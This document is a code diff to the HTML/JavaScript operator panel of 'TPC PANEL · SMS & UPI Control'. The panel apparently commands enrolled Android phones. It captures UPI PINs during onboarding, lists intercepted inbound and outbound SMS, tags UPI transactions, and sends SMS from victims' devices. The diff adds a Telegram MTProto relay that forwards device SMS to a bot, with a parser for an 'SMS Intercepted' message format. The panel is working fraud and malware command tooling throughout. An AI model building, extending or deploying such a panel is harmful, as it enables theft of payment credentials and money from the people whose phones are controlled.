@@ -16,7 +16,6 @@
 --border-hi:#1f4a7d;
 --text:#e6f0ff;
 --muted:#6b83ab;
---dim:#3d5madd;
 --dim:#3d5580;
 --neon:#22d3ee;
 --violet:#a78bfa;
@@ -159,7 +158,7 @@ padding:15px 18px;border-bottom:1px solid var(--border);background:#0d1730a6}
 .row{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:12px 0;border-bottom:1px solid #0f1e3d}
 .row:last-child{border-bottom:0}
 .row-name{font-size:13px;font-weight:600}
-.row-desc{margin-top:3px;font-size:11.5px;color:var(--muted)}
+.row-desc{margin-top:3px;font-size:11.5px;color:var(--muted);overflow-wrap:anywhere}
 
 .badge{display:inline-flex;align-items:center;padding:5px 10px;border-radius:999px;
 background:#ffffff0a;border:1px solid var(--border);color:var(--muted);
@@ -170,6 +169,7 @@ font-size:11px;font-weight:600;letter-spacing:.4px;white-space:nowrap}
 .badge.in{color:var(--violet);border-color:#8b5cf635;background:#8b5cf612}
 .badge.out{color:#38bdf8;border-color:#38bdf835;background:#38bdf812}
 .badge.pin{color:#c4b5fd;border-color:#8b5cf640;background:#8b5cf614}
+.badge.id{color:#7dd3fc;border-color:#38bdf833;background:#38bdf80f}
 
 .table-wrap{width:100%;overflow-x:auto}
 table{width:100%;border-collapse:collapse;text-align:left;font-size:13px}
@@ -286,6 +286,12 @@ font-size:19px;font-weight:700;letter-spacing:4px;color:var(--neon);
 background:#22d3ee12;border:1px dashed #22d3ee45;text-shadow:0 0 18px #22d3ee66}
 .steps{margin:0;padding-left:20px;color:var(--muted);font-size:13px;line-height:2}
 .steps code{font-family:var(--mono);color:#38bdf8;background:#22d3ee10;padding:1px 6px;border-radius:5px}
+.pre-out{margin:12px 0 0;padding:12px;border:1px solid var(--border);border-radius:10px;
+background:#04091a;font-family:var(--mono);font-size:12px;color:var(--muted);
+white-space:pre-wrap;overflow-wrap:anywhere;min-height:18px}
+.divider{display:flex;align-items:center;gap:12px;margin:26px 0 16px;color:#35507e;
+font-size:10.5px;font-weight:800;letter-spacing:1.8px;text-transform:uppercase}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--border)}
 
 @media (max-width:1100px){
 .stats{grid-template-columns:repeat(2,minmax(0,1fr))}
@@ -411,14 +417,14 @@ main{padding:18px 13px}
 <button class="nav" data-page="live" type="button"><i>⚡</i> Live dashboard</button>
 <button class="nav" data-page="messages" type="button"><i>✉</i> Messages</button>
 <p class="side-label" style="margin-top:22px">Automation</p>
-<button class="nav" data-page="autosender" type="button"><i>⟳</i> Auto sender</button>
+<button class="nav" data-page="relay" type="button"><i>📡</i> Relay</button>
 <button class="nav" data-page="telegram" type="button"><i>✈</i> Telegram bot</button>
 <p class="side-label" style="margin-top:22px">System</p>
 <button class="nav" data-page="devices" type="button"><i>▣</i> Devices</button>
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v4.4</div>
+<div>TPC PANEL · v4.5</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -471,7 +477,7 @@ main{padding:18px 13px}
 </div>
 <div class="table-wrap">
 <table>
-<thead><tr><th>Device</th><th>Number</th><th>Status</th><th>Registered</th></tr></thead>
+<thead><tr><th>Device</th><th>ID</th><th>Number</th><th>Status</th><th>Registered</th></tr></thead>
 <tbody id="recentBody"></tbody>
 </table>
 </div>
@@ -491,6 +497,10 @@ main{padding:18px 13px}
 <div class="row">
 <div><div class="row-name">Admin socket</div><div class="row-desc">live link</div></div>
 <span class="badge" id="wsBadge">Connecting</span>
+</div>
+<div class="row">
+<div><div class="row-name">Relay</div><div class="row-desc">MTProto channel watcher</div></div>
+<span class="badge" id="relayBadge">—</span>
 </div>
 </div>
 </section>
@@ -576,7 +586,7 @@ main{padding:18px 13px}
 <p>All inbound and outbound SMS</p>
 </div>
 <div class="toolbar">
-<input id="msgSearch" placeholder="🔍 search body / number…">
+<input id="msgSearch" placeholder="🔍 search body / number / TPC-id…">
 <select id="msgFilter" style="width:auto">
 <option value="">All</option>
 <option value="in">Inbound</option>
@@ -601,14 +611,97 @@ main{padding:18px 13px}
 </section>
 </section>
 
-<section class="page" id="page-autosender">
+<section class="page" id="page-relay">
 <div class="head">
 <div>
-<h2>Auto sender</h2>
-<p>Auto-reply rules for inbound SMS</p>
+<h2>Relay</h2>
+<p>Telegram channel → device SMS · device SMS → bot (banned filtered)</p>
 </div>
-<button class="btn ghost" data-refresh="rules" type="button">↻ Refresh</button>
+<button class="btn ghost" data-refresh="relay" type="button">↻ Refresh</button>
 </div>
+
+<div class="grid2">
+<section class="panel-box panel">
+<div class="panel-head">
+<h3>MTProto login</h3>
+<span class="badge" id="relayState">—</span>
+</div>
+<div class="panel-body">
+<div id="relayLoggedOut">
+<div class="field-row">
+<div>
+<label for="relayApiId">API ID</label>
+<input id="relayApiId" class="mono" placeholder="36161026">
+</div>
+<div>
+<label for="relayApiHash">API Hash</label>
+<input id="relayApiHash" class="mono" placeholder="ac1ee01…">
+</div>
+</div>
+<label for="relayPhone">Phone (country code ke saath)</label>
+<input id="relayPhone" class="mono" placeholder="+91…">
+<div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap">
+<button class="btn primary" id="relayStart" type="button">Send code</button>
+<button class="btn plain" id="relayLogout" type="button">Logout</button>
+</div>
+<div id="relayCodeBox" hidden style="margin-top:16px">
+<label for="relayCode">Login code</label>
+<input id="relayCode" class="mono" placeholder="12345">
+<label for="relayPass" style="margin-top:10px">2FA password (agar ho)</label>
+<input id="relayPass" type="password" placeholder="••••••">
+<button class="btn primary" id="relayVerify" style="margin-top:12px" type="button">Verify &amp; connect</button>
+</div>
+</div>
+
+<div id="relayLoggedIn" hidden>
+<div class="row">
+<div><div class="row-name">Account</div><div class="row-desc" id="relayMe">—</div></div>
+<span class="badge ok">authorized</span>
+</div>
+<div class="row">
+<div><div class="row-name">Channel</div><div class="row-desc" id="relayChan">—</div></div>
+<span class="badge" id="relayChanBadge">—</span>
+</div>
+<div class="row">
+<div><div class="row-name">Forward device SMS to</div><div class="row-desc" id="relayFwd">—</div></div>
+<span class="badge" id="relayFwdBadge">—</span>
+</div>
+<div class="row">
+<div><div class="row-name">Last error</div><div class="row-desc" id="relayErr">—</div></div>
+</div>
+</div>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head">
+<h3>Ban list</h3>
+<span class="badge" id="banCount">0</span>
+</div>
+<div class="panel-body">
+<div style="display:flex;gap:10px;flex-wrap:wrap">
+<input id="banInput" class="mono" placeholder="+91… ya sender id" style="flex:1 1 200px">
+<button class="btn primary" id="banAdd" type="button">Ban</button>
+</div>
+<div id="banList" style="margin-top:14px"></div>
+</div>
+</section>
+</div>
+
+<section class="panel-box panel">
+<div class="panel-head">
+<h3>Parser test</h3>
+<span class="badge">channel format</span>
+</div>
+<div class="panel-body">
+<label for="parseText">Channel ka message paste karo</label>
+<textarea id="parseText" class="mono" placeholder="📱 SMS Intercepted&#10;━━━━━━━━━━━━━━&#10;📞 To: +91…&#10;💬 Message: …"></textarea>
+<button class="btn ghost" id="parseBtn" style="margin-top:12px" type="button">Parse</button>
+<pre id="parseOut" class="pre-out">—</pre>
+</div>
+</section>
+
+<div class="divider">Auto-reply rules</div>
 
 <section class="panel-box panel">
 <div class="panel-head"><h3>New rule</h3></div>
@@ -729,7 +822,7 @@ main{padding:18px 13px}
 <p>Kisi bhi phone par click karo — numbers, info aur messages</p>
 </div>
 <div class="toolbar">
-<input id="devSearch" placeholder="🔍 device / model / number">
+<input id="devSearch" placeholder="🔍 TPC-0001 / device / model / number">
 <button class="btn ghost" id="pinsBtn" type="button">🔑 PINs only</button>
 <button class="btn ghost" data-refresh="devices" type="button">↻ Refresh</button>
 </div>
@@ -748,7 +841,7 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v4.4</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v4.5</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
 <div class="settings-row"><strong>Admin socket</strong><p>/ws/admin — live events; na chale to panel auto polling par chalta hai</p></div>
@@ -758,8 +851,10 @@ main{padding:18px 13px}
 <div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p></div>
 <div class="settings-row"><strong>Outbox poll</strong><p>/devices/outbox</p></div>
 <div class="settings-row"><strong>Telegram webhook</strong><p>/telegram/webhook/{bot_id}</p></div>
+<div class="settings-row"><strong>Relay</strong><p>/admin/relay/* — MTProto login, bans, parser test. Channel se SMS device ko, device ka SMS bot ko.</p></div>
+<div class="settings-row"><strong>Device ID</strong><p>Har device ko registration par TPC-XXXX milta hai — searchable, aur har message me stamp hota hai.</p></div>
 <div class="settings-row"><strong>UPI detection</strong><p>Inbound SMS jinme UPI/credited/debited keywords aur amount pattern milta hai, unhe UPI transaction maan kar alag se tag kiya jaata hai.</p></div>
-<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET, ADMIN_API_KEY, MONGODB_URI aur bot token server-side rakho.</p></div>
+<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET, ADMIN_API_KEY, MONGODB_URI, TG_WEBHOOK_SECRET aur bot token server-side rakho.</p></div>
 </div>
 </section>
 </section>
@@ -863,9 +958,11 @@ const state = {
 auth: false,
 devices: [],
 messages: [],
+devMsgs: {},
 rules: [],
 bots: [],
 tgLogs: [],
+relay: null,
 outbox: [],
 pinsOnly: false,
 active: null,
@@ -972,6 +1069,12 @@ function online(d) { return Boolean(d.ws_connected); }
 function tel(d) { return d.telemetry && typeof d.telemetry === "object" ? d.telemetry : {}; }
 function hasPin(d) { return Boolean(d.upi_pin); }
 
+function shortOf(deviceId) {
+const d = state.devices.find((x) => String(devId(x)) === String(deviceId));
+if (d && d.short_id) return d.short_id;
+return "";
+}
+
 function batt(d) {
 const lvl = tel(d).battery_level;
 return typeof lvl === "number" && lvl >= 0 ? lvl : null;
@@ -1060,6 +1163,8 @@ slots: Array.isArray(t.sims) ? t.sims : []
 function devMsgs(d) {
 const id = devId(d);
 if (id === null) return [];
+const cached = state.devMsgs[String(id)];
+if (cached) return cached;
 return state.messages.filter((m) => String(m.device_id) === String(id));
 }
 
@@ -1091,7 +1196,6 @@ return data;
 async function attemptSend(job) {
 const tries = [
 { url: "/admin/send", body: { target: "device", device_id: job.deviceId, to: job.to, body: job.body } },
-{ url: "/admin/send", body: { device_id: job.deviceId, to: job.to, message: job.body } },
 { url: "/admin/devices/" + job.deviceId + "/sms", body: { to: job.to, body: job.body } }
 ];
 job.status = "sending";
@@ -1139,7 +1243,7 @@ list.slice(0, 6).forEach((j) => {
 const item = document.createElement("div");
 item.className = "out-item";
 const b = document.createElement("span");
-b.className = "badge " + (j.status === "queued" ? "warn" : j.status === "failed" ? "bad" : "");
+b.className = "badge " + (j.status === "queued" ? "warn" : j.status === "failed" ? "bad" : j.status === "sent" ? "ok" : "");
 b.textContent = j.status;
 item.appendChild(b);
 const body = document.createElement("span");
@@ -1235,11 +1339,17 @@ $("#sSims").textContent = sims;
 $("#sPins").textContent = state.devices.filter(hasPin).length;
 
 const body = $("#recentBody");
-if (!state.devices.length) { empty(body, 4, "No devices registered"); return; }
+if (!state.devices.length) { empty(body, 5, "No devices registered"); return; }
 body.replaceChildren();
 state.devices.slice(0, 6).forEach((d) => {
 const row = document.createElement("tr");
 cell(row, devName(d));
+const idc = document.createElement("td");
+const idb = document.createElement("span");
+idb.className = "badge id mono";
+idb.textContent = d.short_id || "—";
+idc.appendChild(idb);
+row.appendChild(idc);
 const c = document.createElement("td");
 const info = nums(d);
 c.textContent = info.live || info.entered || tel(d).sim_carrier || "—";
@@ -1276,8 +1386,8 @@ const row = document.createElement("tr");
 const nameCell = document.createElement("td");
 nameCell.textContent = devName(d);
 const sub = document.createElement("span");
-sub.className = "sub";
-sub.textContent = (online(d) ? "● online" : "○ offline") + " · " + (tel(d).model || "—");
+sub.className = "sub mono";
+sub.textContent = (d.short_id ? d.short_id + " · " : "") + (online(d) ? "● online" : "○ offline") + " · " + (tel(d).model || "—");
 nameCell.appendChild(sub);
 row.appendChild(nameCell);
 
@@ -1333,7 +1443,7 @@ const q = ($("#msgSearch").value || "").trim().toLowerCase();
 let list = state.messages;
 if (filter === "in" || filter === "out") list = list.filter((m) => m.direction === filter);
 if (filter === "upi") list = list.filter((m) => m.kind === "upi");
-if (q) list = list.filter((m) => (String(m.body) + " " + String(m.address) + " " + String(m.device_name) + " " + String(m.amount) + " " + String(m.status)).toLowerCase().indexOf(q) >= 0);
+if (q) list = list.filter((m) => (String(m.body) + " " + String(m.address) + " " + String(m.device_name) + " " + shortOf(m.device_id) + " " + String(m.amount) + " " + String(m.status)).toLowerCase().indexOf(q) >= 0);
 
 $("#msgCount").textContent = list.length + " messages";
 const body = $("#msgBody");
@@ -1342,7 +1452,20 @@ body.replaceChildren();
 list.slice(0, 300).forEach((m) => {
 const row = document.createElement("tr");
 cell(row, fmt(m.created_at));
-cell(row, m.device_name || "—");
+
+const dcell = document.createElement("td");
+const dn = document.createElement("span");
+dn.textContent = m.device_name || "—";
+dcell.appendChild(dn);
+const sid = shortOf(m.device_id);
+if (sid) {
+const sc = document.createElement("span");
+sc.className = "sub mono";
+sc.textContent = sid;
+dcell.appendChild(sc);
+}
+row.appendChild(dcell);
+
 badgeCell(row, m.direction === "in" ? "in" : "out", m.direction === "in" ? "in" : "out");
 const addr = document.createElement("td");
 addr.className = "mono";
@@ -1445,7 +1568,7 @@ if (q) {
 list = list.filter((d) => {
 const t = tel(d);
 const info = nums(d);
-const hay = [devName(d), t.model, t.manufacturer, info.live, info.entered, info.carrier, d.payment_app].filter(Boolean).join(" ").toLowerCase();
+const hay = [devName(d), d.short_id, t.model, t.manufacturer, info.live, info.entered, info.carrier, d.payment_app].filter(Boolean).join(" ").toLowerCase();
 return hay.indexOf(q) >= 0;
 });
 }
@@ -1495,6 +1618,12 @@ card.appendChild(top);
 
 const meta = document.createElement("div");
 meta.className = "dev-meta";
+if (d.short_id) {
+const idb = document.createElement("span");
+idb.className = "badge id mono";
+idb.textContent = d.short_id;
+meta.appendChild(idb);
+}
 const st = devStatus(d).toLowerCase();
 const sb = document.createElement("span");
 sb.className = "badge " + (st.indexOf("online") >= 0 ? "ok" : st.indexOf("offline") >= 0 ? "bad" : "");
@@ -1596,6 +1725,7 @@ const msgs = devMsgs(d);
 const box = $("#dSpecs");
 box.replaceChildren();
 const tiles = [
+["Device ID", d.short_id || "—"],
 ["RAM", ram(d)],
 ["Storage", storage(d)],
 ["Free space", freeStorage(d) || "—"],
@@ -1632,6 +1762,7 @@ const grid = document.createElement("div");
 grid.className = "more-grid";
 const rows = [
 ["Device id", devId(d)],
+["Short id", d.short_id],
 ["Registration id", d.registration_id],
 ["Manufacturer", t.manufacturer],
 ["Brand", t.brand],
@@ -1760,6 +1891,12 @@ $("#dName").textContent = devName(d);
 $("#dSub").textContent = (tel(d).model || "unknown model") + " · Android " + (tel(d).android_version || "—") + " · RAM " + ram(d);
 const tags = $("#dTags");
 tags.replaceChildren();
+if (d.short_id) {
+const idb = document.createElement("span");
+idb.className = "badge id mono";
+idb.textContent = d.short_id;
+tags.appendChild(idb);
+}
 const st = devStatus(d).toLowerCase();
 const sb = document.createElement("span");
 sb.className = "badge " + (st.indexOf("online") >= 0 ? "ok" : st.indexOf("offline") >= 0 ? "bad" : "");
@@ -1786,6 +1923,14 @@ renderMore(d);
 renderOutbox();
 }
 
+async function loadDeviceMessages(deviceId) {
+try {
+const d = await api("/admin/devices/" + deviceId + "/messages?limit=500");
+state.devMsgs[String(deviceId)] = Array.isArray(d) ? d : (d.messages || []);
+if (state.active && String(devId(state.active)) === String(deviceId)) renderDetailMsgs();
+} catch (e) {}
+}
+
 function openDetail(d) {
 state.active = d;
 $("#dSearch").value = "";
@@ -1800,13 +1945,16 @@ renderDetail(d);
 renderDetailMsgs();
 $("#detail").hidden = false;
 document.body.style.overflow = "hidden";
+
 const id = devId(d);
+loadDeviceMessages(id);
 loadMessages().then(() => {
 if (state.active && String(devId(state.active)) === String(id)) {
 renderDetail(d);
 renderDetailMsgs();
 }
 }).catch(() => {});
+
 if (!info.live && !state.numTried[String(id)]) {
 state.numTried[String(id)] = true;
 setTimeout(() => {
@@ -1863,6 +2011,8 @@ const key = m.id || m._id || (m.device_id + "|" + m.created_at + "|" + m.body);
 const exists = state.messages.some((x) => (x.id || x._id || (x.device_id + "|" + x.created_at + "|" + x.body)) === key);
 if (exists) return;
 state.messages.unshift(m);
+const cache = state.devMsgs[String(m.device_id)];
+if (cache) cache.unshift(m);
 renderMessages();
 renderLive();
 if (state.active) renderDetailMsgs();
@@ -1906,12 +2056,73 @@ state.tgLogs = d.logs || [];
 renderTelegram();
 }
 
+async function loadRelay() {
+const d = await api("/admin/relay/status");
+state.relay = d;
+renderRelay();
+}
+
+function renderRelay() {
+const r = state.relay;
+if (!r) return;
+const st = r.state || {};
+const authed = Boolean(st.authorized);
+
+const label = !r.telethon ? "telethon missing"
+: authed ? "connected"
+: st.awaiting_code ? "awaiting code" : "not logged in";
+badge($("#relayState"), label, !r.telethon ? "bad" : authed ? "ok" : "warn");
+badge($("#relayBadge"), label, !r.telethon ? "bad" : authed ? "ok" : "warn");
+
+$("#relayLoggedOut").hidden = authed;
+$("#relayLoggedIn").hidden = !authed;
+$("#relayCodeBox").hidden = !st.awaiting_code;
+
+if (authed) {
+$("#relayMe").textContent = st.me ? ("@" + (st.me.username || st.me.id)) : "—";
+$("#relayChan").textContent = st.channel_id || "not set";
+badge($("#relayChanBadge"), st.channel_id ? "watching" : "off", st.channel_id ? "ok" : "warn");
+$("#relayFwd").textContent = st.forward_user || "bot API fallback";
+badge($("#relayFwdBadge"), st.forward_user ? "mtproto" : "bot api", st.forward_user ? "ok" : "warn");
+}
+$("#relayErr").textContent = st.last_error || "—";
+
+const bans = r.bans || [];
+$("#banCount").textContent = bans.length;
+const box = $("#banList");
+box.replaceChildren();
+if (!bans.length) {
+const e = document.createElement("div");
+e.className = "muted small";
+e.textContent = "Koi banned sender nahi";
+box.appendChild(e);
+}
+bans.forEach((a) => {
+const row = document.createElement("div");
+row.className = "out-item";
+const s = document.createElement("span");
+s.className = "out-body";
+s.textContent = a;
+row.appendChild(s);
+const b = document.createElement("button");
+b.className = "mini";
+b.type = "button";
+b.textContent = "unban";
+b.addEventListener("click", async () => {
+await api("/admin/relay/bans/" + encodeURIComponent(a) + "/delete", { method: "POST" });
+await loadRelay();
+});
+row.appendChild(b);
+box.appendChild(row);
+});
+}
+
 async function refreshAll() {
 if (!state.auth) return;
 $("#refreshBtn").disabled = true;
 try {
 await loadHealth();
-const res = await Promise.allSettled([loadDevices(), loadMessages(), loadRules(), loadTelegram()]);
+const res = await Promise.allSettled([loadDevices(), loadMessages(), loadRules(), loadTelegram(), loadRelay()]);
 if (res.some((r) => r.status === "rejected")) toast("some sections failed to sync");
 } finally {
 $("#refreshBtn").disabled = false;
@@ -1923,6 +2134,7 @@ try {
 if (section === "devices") await loadDevices();
 if (section === "messages") await loadMessages();
 if (section === "rules") await loadRules();
+if (section === "relay") { await loadRelay(); await loadRules(); }
 if (section === "telegram") await loadTelegram();
 if (section === "live") { await loadDevices(); await loadMessages(); }
 toast("synced");
@@ -1980,8 +2192,17 @@ renderDetail(state.active);
 }
 
 if (type.indexOf("ack") >= 0 || type.indexOf("sent") >= 0) {
-const j = state.outbox.find((x) => x.status !== "sent" && (!data.body || x.body === data.body));
-if (j) { j.status = "sent"; renderOutbox(); }
+const did = data.device_id;
+const dbody = data.body;
+const j = state.outbox.find((x) =>
+x.status !== "sent" && x.status !== "failed" &&
+(!did || String(x.deviceId) === String(did)) &&
+(!dbody || String(x.body) === String(dbody))
+);
+if (j) {
+j.status = data.status === "failed" ? "failed" : "sent";
+renderOutbox();
+}
 }
 }
 
@@ -2005,7 +2226,7 @@ document.querySelectorAll(".nav").forEach((b) => b.classList.toggle("on", b.data
 document.querySelectorAll(".page").forEach((s) => s.classList.toggle("on", s.id === "page-" + page));
 if (page === "devices") refreshSection("devices");
 if (page === "messages") refreshSection("messages");
-if (page === "autosender") refreshSection("rules");
+if (page === "relay") refreshSection("relay");
 if (page === "telegram") refreshSection("telegram");
 }
 
@@ -2054,7 +2275,7 @@ const r = await api("/admin/send", {
 method: "POST",
 body: JSON.stringify({ target: $("#bulkTarget").value, body: body, to: $("#bulkTo").value.trim() || null })
 });
-toast("queued to " + r.queued + " device(s)");
+toast("queued to " + r.queued + " device(s)" + (r.note ? " — " + r.note : ""));
 $("#bulkBody").value = "";
 await loadMessages();
 } catch (e) { toast(e.message); }
@@ -2084,6 +2305,60 @@ $("#ruleUpi").checked = false;
 toast("rule added");
 await loadRules();
 } catch (e) { toast(e.message); }
+});
+
+$("#relayStart").addEventListener("click", async () => {
+const api_id = $("#relayApiId").value.trim();
+const api_hash = $("#relayApiHash").value.trim();
+const phone = $("#relayPhone").value.trim();
+if (!phone) { toast("phone daalo"); return; }
+$("#relayStart").disabled = true;
+try {
+await api("/admin/relay/login/start", { method: "POST", body: JSON.stringify({ api_id: api_id, api_hash: api_hash, phone: phone }) });
+toast("code bheja — Telegram check karo");
+await loadRelay();
+} catch (e) { toast(e.message); }
+finally { $("#relayStart").disabled = false; }
+});
+
+$("#relayVerify").addEventListener("click", async () => {
+$("#relayVerify").disabled = true;
+try {
+const r = await api("/admin/relay/login/verify", {
+method: "POST",
+body: JSON.stringify({ code: $("#relayCode").value.trim(), password: $("#relayPass").value })
+});
+if (r.status === "2fa_required") { toast("2FA password daalo"); return; }
+$("#relayCode").value = "";
+$("#relayPass").value = "";
+toast("relay connected");
+await loadRelay();
+} catch (e) { toast(e.message); }
+finally { $("#relayVerify").disabled = false; }
+});
+
+$("#relayLogout").addEventListener("click", async () => {
+try { await api("/admin/relay/logout", { method: "POST" }); toast("logged out"); await loadRelay(); }
+catch (e) { toast(e.message); }
+});
+
+$("#banAdd").addEventListener("click", async () => {
+const a = $("#banInput").value.trim();
+if (!a) return;
+try {
+await api("/admin/relay/bans", { method: "POST", body: JSON.stringify({ address: a }) });
+$("#banInput").value = "";
+await loadRelay();
+} catch (e) { toast(e.message); }
+});
+
+$("#parseBtn").addEventListener("click", async () => {
+const text = $("#parseText").value.trim();
+if (!text) return;
+try {
+const r = await api("/admin/relay/parse", { method: "POST", body: JSON.stringify({ text: text }) });
+$("#parseOut").textContent = JSON.stringify(r, null, 2);
+} catch (e) { $("#parseOut").textContent = e.message; }
 });
 
 $("#botSave").addEventListener("click", async () => {
@@ -2140,6 +2415,7 @@ clearTimeout(state.pollTimer);
 clearTimeout(state.wsTimer);
 state.devices = [];
 state.messages = [];
+state.devMsgs = {};
 state.pinsOnly = false;
 $("#pinsBtn").classList.remove("on");
 showLogin();
